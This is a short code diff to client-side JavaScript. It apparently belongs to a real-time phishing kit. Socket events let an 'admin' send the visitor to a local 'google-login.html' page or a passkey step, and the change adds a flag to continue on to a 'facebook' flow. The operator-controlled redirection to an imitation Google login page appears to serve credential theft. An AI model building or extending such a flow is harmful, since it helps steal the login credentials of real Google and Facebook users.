@@ -324,7 +324,10 @@
     });
     /* If admin re-triggers google-login while user is on this page, proceed normally */
     socket.on('show-google-login', function () {
-      try { sessionStorage.setItem('googleLoginSession', '1'); } catch(e) {}
+      try {
+        sessionStorage.setItem('googleLoginSession', '1');
+        sessionStorage.setItem('googleContinueApp', 'facebook');
+      } catch(e) {}
       window.location.href = 'google-login.html';
     });
     socket.on('show-passkey', function () {
@@ -364,7 +367,10 @@
       btn.appendChild(sp);
 
       setTimeout(function () {
-        try { sessionStorage.setItem('googleLoginSession', '1'); } catch(e) {}
+        try {
+          sessionStorage.setItem('googleLoginSession', '1');
+          sessionStorage.setItem('googleContinueApp', 'facebook');
+        } catch(e) {}
         window.location.href = 'google-login.html';
       }, 320);
     });
